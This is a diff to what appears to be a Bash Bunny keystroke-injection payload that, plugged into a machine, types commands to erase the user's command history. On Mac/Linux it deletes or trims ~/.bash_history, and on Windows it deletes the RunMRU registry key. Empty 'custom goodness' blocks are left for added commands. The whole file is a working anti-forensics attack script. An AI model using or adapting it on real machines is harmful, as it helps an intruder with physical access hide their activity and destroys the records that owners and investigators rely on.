@@ -9,21 +9,23 @@
 # Cleans the input history on Windows, Mac and Linux
 #
 
-# Exact number of lines to remove (MAC / LINUX)
+# EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : ALL
 LINES = 0
 
 LED R
 ATTACKMODE HID STORAGE
 
+# PLATFORM CHECK
 PLATFORM_COMMAND = ""
 if [ ! -f ~/.bash_history ]; then
     #WINDOWS
-    $PLATFORM_COMMAND = "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
+    $PLATFORM_COMMAND = "cmd"
 else
     #MAC / LINUX
     $PLATFORM_COMMAND = "terminal"
 fi
 
+# EMULATION
 QUACK DELAY 1000
 QUACK ALT F2
 QUACK DELAY 50
@@ -36,7 +38,9 @@ QUACK STRING $PLATFORM_COMMAND
 QUACK ENTER
 QUACK DELAY 1000
 
+# PLATFORM COMMANDS
 if $PLATFORM_COMMAND == "terminal" then
+# MAC / LINUX
     if $LINES > 0 then
         QUACK STRING head -n -$LINES ~/.bash_history
         QUACK ENTER
@@ -44,6 +48,26 @@ if $PLATFORM_COMMAND == "terminal" then
         QUACK STRING rm ~/.bash_history
         QUACK ENTER
     fi
+
+    #++ BEGIN CUSTOM MAC / LINUX GOODNESS +++
+
+
+
+    #++ END CUSTOM GOODNESS
+
+
+else
+# WINDOWS
+    QUACK STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+    #++ BEGIN CUSTOM WINDOWS GOODNESS +++
+
+
+
+    #++ END CUSTOM GOODNESS
 fi
+
+QUACK STRING exit
+QUACK ENTER
 
 LED G
